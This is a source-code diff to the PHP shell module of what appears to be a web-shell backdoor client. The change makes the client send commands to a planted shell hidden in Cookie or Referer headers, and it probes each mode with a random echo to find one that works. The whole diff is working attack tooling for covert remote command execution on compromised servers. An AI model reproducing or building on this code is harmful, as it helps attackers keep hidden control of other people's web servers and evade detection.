@@ -15,33 +15,49 @@ class Php(Module):
     :shell.php "<command>;"
     '''
     
+    modes = ['Cookie', 'Referer' ]
+    
     def __init__(self, modhandler, url, password):
         
         self.cwd_vector = None
         self.path = None
         self.proxy = None
         
+        self.current_mode = None
+        
+        
         Module.__init__(self, modhandler, url, password)
         
-        proxy = self.modhandler.conf.get_option('global', 'http_proxy')
+        proxy = modhandler.conf.get_option('global', 'http_proxy')
         if proxy:
             print '[shell.php] Setting http proxy \'%s\'' % (proxy)
             self.proxy = { 'http' : proxy }
             
-            
-        if self.run('is_callable("is_dir") && is_callable("chdir") && print(1);', False) != '1':
-            print '[!] Error testing directory change methods, \'cd\' and \'ls\' will not work.'
-        else:
-            self.cwd_vector = "chdir('%s') && %s" 
+        mode = modhandler.conf.get_option('global', 'request_mode')
+        if mode in self.modes:
+            self.modes = [ mode ]
         
 
     def _probe(self):
         
+        found = False
+        for currentmode in self.modes:
+            
+            rand = str(random.randint( 11111, 99999 ))
+            self.current_mode = currentmode
+            
+            if self.run('echo %s;' % (rand)) == rand:
+                found = True
+                break
         
-        rand = str(random.randint( 11111, 99999 ))
-        if self.run('echo %s;' % (rand)) != rand:
-            raise ModuleException("shell.sh",  "PHP interpreter initialization failed")
         
+        if not found:
+            raise ModuleException("shell.php",  "PHP interpreter initialization failed")
+        else:
+            if self.run('is_callable("is_dir") && is_callable("chdir") && print(1);', False) != '1':
+                print  '[!] Error testing directory change methods, \'cd\' and \'ls\' will not work.'
+            else:
+                self.cwd_vector = "chdir('%s') && %s" 
     
     def run(self, cmd, use_current_path = True):
 
@@ -49,8 +65,9 @@ class Php(Module):
             cmd = self.cwd_vector % (self.path, cmd)
         
         request = CmdRequest( self.url, self.password, self.proxy)
-        request.setPayload(cmd)
-        
+        request.setPayload(cmd, self.current_mode)
+        #print cmd, self.current_mode
+         
         
         try:
             resp = request.execute()
